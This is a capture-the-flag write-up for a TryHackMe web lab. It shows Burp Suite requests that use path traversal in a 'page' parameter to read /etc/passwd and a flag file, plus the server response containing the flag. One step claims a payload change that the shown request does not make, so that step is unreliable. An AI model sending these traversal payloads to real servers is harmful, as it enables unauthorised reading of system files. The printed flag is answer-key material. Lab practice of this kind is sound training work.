
Want to hear some lo-fi beats, to relax or study to? We've got you covered! 

  

**Access this challenge** by deploying both the vulnerable machine by pressing the green "Start Machine" button located within this task, and the TryHackMe AttackBox by pressing the  "Start AttackBox" button located at the top-right of the page.

Navigate to the following URL using the AttackBox: [http://10.10.24.17](http://10.10.24.17) and find the flag in the **root of the filesystem.**


## Writeup

1) I opened Burp-suite and immediately launched the browser in the **proxy** tab.
2) I pasted the Lab's link and intercepted it .
3) Then i chose a GET request : 

```Request in Proxy
GET /?page=../../../etc/passwd HTTP/1.1
Host: 10.10.24.17
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.24.17/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

```

4) Then I sent that **GET Request** to the repeater for tweaking it a bit. This time, since we cant use traversal sequence, as it seems the developers blocked it, we still have a way to bypass the absolute path. Here is what i changed:


```Request in Repeater
GET /?page=../../../etc/passwd HTTP/1.1
Host: 10.10.24.17
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.24.17/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```


5) It successfully showed me the files in the `passwd` directory. 

6) But I needed to reach the flag.txt file which was in the root directory, after a long time , i finally cleared up after watching the write-up video, I just had to:

```Request in Repeater
GET /?page=../../../flag.txt HTTP/1.1
Host: 10.10.24.17
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.24.17/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

7) Looks so simpleeee, I feel dumb for not figuring this one out myself.

8) And ofcourse I got the flag:

```html
HTTP/1.1 200 OK
Date: Sat, 18 Jan 2025 15:23:44 GMT
Server: Apache/2.2.22 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 3915
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html

<!DOCTYPE html>
<html lang="en">

<head>

    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css"
        integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">

    <style>
        body {
            padding-top: 56px;
            padding-bottom: 56px;
            min-height: 100vh;
            position: relative;
        }
        .footer {
            bottom: 0;
            width: 100%;
            position: absolute;
            height: 56px;
        }
    </style>

    <title>Lo-Fi Music</title>
</head>

<body>

    <!-- Navigation -->
    <nav class="navbar navbar-expand-lg navbar-dark bg-dark fixed-top">
        <div class="container">
            <a class="navbar-brand" href="/">Lo-Fi Music</a>
            <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarResponsive"
                aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>
            <div class="collapse navbar-collapse" id="navbarResponsive">
            </div>
        </div>
    </nav>

    

        <!-- Page Content -->
    <div class="container">

        <div class="row">

            <!-- Blog Entries Column -->
            <div class="col-md-8">

                <h1 class="my-4">Cool beats to listen to</i></h1>


                <!-- Blog Post -->
                <div class="card mb-4">
					<div class="card-body">


						flag{e4478e0eab69bd642b8238765dcb7d18}                	</div>
                </div>

            
            </div>

            <!-- Sidebar Widgets Column -->
            <div class="col-md-4">

                <!-- Search Widget -->
                <div class="card my-4">
                    <h5 class="card-header">Search</h5>
                    <div class="card-body">
                        <form action="/" method="get">
                            <div class="input-group">
                                <input type="text" class="form-control" name="search" placeholder="Search for...">
                                <span class="input-group-btn">
                                    <button class="btn btn-secondary" type="submit">Go!</button>
                                </span>
                            </div>
                        </form>
                    </div>
                </div>

                <!-- Categories Widget -->
                <div class="card my-4">
                    <h5 class="card-header">Discography</h5>
                    <div class="card-body">
                        <div class="row">
                            <div class="col-lg-6">
                                <ul class="list-unstyled mb-0">
                                    <li><a href="/?page=relax.php">Relax</a></li>
                                    <li><a href="/?page=sleep.php">Sleep</a></li>
									<li><a href="/?page=chill.php">Chill</a></li>    
									<li><a href="/?page=coffee.php">Coffee</a></li>
									<li><a href="/?page=vibe.php">Vibe</a></li>
									<li><a href="/?page=game.php">Game</a></li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>

            </div>
        </div>
        <!-- /.row -->
    </div>
    <!-- /.container -->


    <!-- Footer -->
    <footer class="py-3 bg-dark footer">
        <div class="container">
                &nbsp;
        </div>
        <!-- /.container -->
    </footer>


</body>

</html>
```



